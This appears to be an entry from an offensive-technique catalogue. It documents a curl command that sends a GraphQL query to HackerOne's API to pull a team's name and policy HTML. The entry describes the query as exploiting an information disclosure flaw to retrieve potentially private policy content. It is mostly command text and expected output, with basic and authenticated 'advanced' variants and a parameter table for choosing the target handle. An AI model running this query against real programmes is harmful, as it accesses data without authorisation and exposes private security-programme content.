---
data: >-
  curl -X POST https://api.hackerone.com/graphql -H 'Content-Type:
  application/json' -d '{"query": "query { team(handle:\"example\") { name
  policy_markdown_html } }"}'
tags:
  - graphql
  - api-query
type: command
output: >-
  {"data": {"team": {"name": "example test", "policy_markdown_html": "No
  Technology is perfect and example believes that working with skilled security
  researchers........" }}}
executor: curl
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:00.143Z'
id: a9eee2fa-14a1-4fa0-9ebd-56949a5e12b5
verified: false
validated: true
submitted: true
---
# graphql-team-policy-query

## Command

```bash
curl -X POST https://api.hackerone.com/graphql -H 'Content-Type: application/json' -d '{"query": "query { team(handle:\"example\") { name policy_markdown_html } }"}'
```

## Description

This command sends a GraphQL query to HackerOne's API to fetch a team's name and policy_markdown_html field, exploiting the information disclosure vulnerability to retrieve potentially private policy content.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `handle` | Team handle (e.g., 'example') - specifies the target team | Yes |
| Endpoint | GraphQL API URL (default: https://api.hackerone.com/graphql) | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://api.hackerone.com/graphql -H 'Content-Type: application/json' -d '{"query": "query { team(handle:\"example\") { name policy_markdown_html } }"}'
```

### Advanced Usage

```bash
curl -X POST https://api.hackerone.com/graphql -H 'Content-Type: application/json' -H 'Authorization: Bearer token' -d '{"query": "query { team(handle:\"target\") { name policy_markdown_html } }"}'
```

(Though unauthenticated in vulnerability.)

## Expected Output

JSON response with team data: {"data": {"team": {"name": "Team Name", "policy_markdown_html": "HTML policy content or null" }}}. Variations indicate private status.

## Related

- [[Related Procedure: Query-Team-Policy-Endpoint]]
